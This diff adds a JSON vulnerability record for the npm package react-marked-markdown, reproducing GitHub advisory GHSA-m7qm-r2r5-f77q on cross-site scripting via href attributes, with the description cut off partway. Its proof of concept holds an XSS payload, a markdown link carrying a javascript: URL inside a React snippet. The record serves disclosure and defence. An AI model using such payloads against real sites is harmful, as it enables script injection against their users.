@@ -1,0 +1,28 @@
+{
+  "packageName": "react-marked-markdown",
+  "lastUpdated": "2026-05-04T13:06:56.926Z",
+  "vulnerabilities": [
+    {
+      "id": "GHSA-m7qm-r2r5-f77q",
+      "packageName": "react-marked-markdown",
+      "title": "Cross-Site Scripting in react-marked-markdown",
+      "description": "All versions of `react-marked-markdown` are vulnerable to cross-site scripting (XSS) via `href` attributes. This is exploitable if user is provided to `react-marked-markdown`\n\nProof of concept:\n\n```\nimport React from 'react'\nimport ReactDOM from 'react-dom'\nimport { MarkdownPreview } from 'react-marked-markdown'\n\nReactDOM.render(\n<MarkdownPreview\nmarkedOptions={{ sanitize: true }}\nvalue={'[XSS](javascript: alert`1`)'}\n/>,\ndocument.getElementById('root')\n)\n```\n\n\n## Recommendation\n\nNo fix is curre",
+      "severity": "high",
+      "url": "https://github.com/advisories/GHSA-m7qm-r2r5-f77q",
+      "publishedAt": "2020-09-01T20:43:48Z",
+      "modifiedAt": "2023-01-09T05:03:45Z",
+      "identifiers": [
+        {
+          "type": "GHSA",
+          "value": "GHSA-m7qm-r2r5-f77q"
+        }
+      ],
+      "affectedVersions": [
+        {
+          "range": ">= 0.0.0"
+        }
+      ],
+      "source": "github"
+    }
+  ]
+}
